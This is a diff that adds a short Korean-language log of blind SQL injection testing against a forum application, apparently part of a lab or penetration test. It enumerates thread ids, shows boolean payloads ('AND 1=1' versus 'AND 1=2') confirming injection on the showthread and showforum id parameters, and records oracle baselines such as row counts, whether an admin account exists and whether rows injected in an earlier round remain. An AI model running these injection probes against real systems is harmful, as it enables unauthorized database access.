@@ -1,0 +1,24 @@
+### 스레드 id 발견 (포럼 페이지에서)
+  showforum?id=0 → 200, thread ids=['0', '1', '2', '3', '4', '5', '6', '7']
+  showforum?id=1 → 200, thread ids=['0', '1', '2', '3']
+  showforum?id=2 → 200, thread ids=['0', '1']
+  전체 스레드 id: [0, 1, 2, 3, 4, 5, 6, 7]
+
+### id SQLi 재확인 (현존 id 대상)
+  showthread id=0: AND 1=1 → 200 / AND 1=2 → 500
+  showthread id=1: AND 1=1 → 200 / AND 1=2 → 500
+  showthread id=2: AND 1=1 → 200 / AND 1=2 → 500
+  showthread id=3: AND 1=1 → 200 / AND 1=2 → 500
+  showforum  id=0: AND 1=1 → 200 / AND 1=2 → 500
+  showforum  id=1: AND 1=1 → 200 / AND 1=2 → 500
+  showforum  id=2: AND 1=1 → 200 / AND 1=2 → 500
+
+### 오라클 기준값 (리셋 후 드리프트 기록)
+  (1=1) TRUE 행수  : 114
+  (1=2) FALSE 행수 : 0
+  posts 총수 <30?  : True / <200? True
+  users 총수 >200? : True
+  admin 실존?      : True
+  Round13 주입행 잔존? : True
+
+총 요청 24건 (읽기 전용)
